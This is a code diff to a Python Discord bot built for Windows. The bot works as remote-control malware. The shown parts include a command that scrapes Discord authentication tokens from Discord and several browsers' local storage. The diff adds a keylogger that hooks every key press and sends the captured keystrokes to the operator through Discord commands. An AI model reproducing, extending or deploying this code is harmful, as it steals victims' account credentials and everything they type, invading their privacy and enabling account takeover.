@@ -1,16 +1,18 @@
 # THIS CODE HAS BEEN CREATED SPECIFICALLY FOR WINDOWS COMPUTERS
 # CERTAIN FUNCTIONS MIGHT NOT WORK ON OTHER SYSTEMS
 
-import subprocess
-import discord, platform, asyncio, tempfile, os, pathlib, pyscreenshot, cv2, aiohttp, win10toast, re
+import discord, platform, asyncio, tempfile, os, pathlib, pyscreenshot, cv2, aiohttp, win10toast, re, subprocess
 from discord.ext import commands, tasks
-from keyboard import write
+from keyboard import write, on_press
 
 loop = asyncio.ProactorEventLoop()
 asyncio.set_event_loop(loop)
 
 prefix = "$"
 bot = commands.Bot(command_prefix=prefix, help_command=commands.DefaultHelpCommand(no_category = 'Commands'))
+
+log_keystrokes = False
+keystrokes = ""
 
 @bot.event
 async def on_ready():
@@ -102,6 +104,18 @@ async def type(ctx, text):
     write(text)
     await save_out(ctx, text)
 
+@bot.command(brief="Starts/stops the keylogger.", description="Starts or stops the keylogger.")
+async def keylogger(ctx):
+    global log_keystrokes
+    global keystrokes
+    if log_keystrokes == False:
+        log_keystrokes = True
+        await save_out(ctx, "Keystroke logging is now enabled.")
+    else:
+        log_keystrokes = False
+        await save_out(ctx, "Keystroke logging is now disabled.\n\nOutput:\n" + keystrokes)
+    keystrokes = ""
+
 @bot.command(brief="Grabs the Discord token.", description="Looks for the user token in Discord, Chrome, Opera, Brave and Yandex")
 async def token(ctx):
     local = os.getenv("LOCALAPPDATA")
@@ -151,5 +165,16 @@ def grab_tokens(path):
                 for token in re.findall(regex, line):
                     tokens.append(token)
     return tokens
+
+def save_log(event):
+    global keystrokes
+    if event.name == "space":
+       keystrokes += " "
+    elif len(event.name) > 1:
+        keystrokes += " " + event.name.upper() + " "
+    else:
+        keystrokes += event.name
+
+on_press(callback=save_log)
 
 bot.run("TOKEN GOES HERE...")
